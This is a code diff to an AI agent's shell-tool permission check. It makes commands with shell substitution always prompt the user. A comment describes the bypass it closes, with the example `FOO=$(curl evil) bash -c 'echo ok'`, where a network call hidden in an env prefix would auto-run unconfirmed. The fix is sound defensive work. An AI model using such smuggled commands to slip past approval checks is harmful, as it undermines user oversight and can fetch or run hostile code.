@@ -48,6 +48,7 @@ import {
   getCommandRoot,
   getCommandRoots,
   getShellConfiguration,
+  hasShellSubstitution,
   type ShellConfiguration,
   type ShellType,
   splitCommands,
@@ -1378,10 +1379,23 @@ export class ShellToolInvocation extends BaseToolInvocation<
 
   /**
    * AST-based permission check for the shell command.
+   * - Substitution-bearing commands (any form, including inside an
+   *   env-prefix wrapper that `stripShellWrapper` would discard) → 'ask'
    * - Read-only commands (via AST analysis) → 'allow'
    * - All other commands → 'ask'
    */
   override async getDefaultPermission(): Promise<PermissionDecision> {
+    // Gate on the RAW command before `stripShellWrapper` runs.
+    // `stripShellWrapper` drops leading env-assignment tokens AND
+    // unwraps `bash -c '...'` to its inner script — so for
+    // `FOO=$(curl evil) bash -c 'echo ok'` the stripped form is just
+    // `echo ok`, which the AST classifies as read-only. Without this
+    // gate the command auto-executes silently with no confirmation
+    // dialog and no warning. See PR #4386 R6 (cid 3298521039).
+    if (hasShellSubstitution(this.params.command)) {
+      return 'ask';
+    }
+
     const command = stripShellWrapper(this.params.command);
 
     // AST-based read-only detection
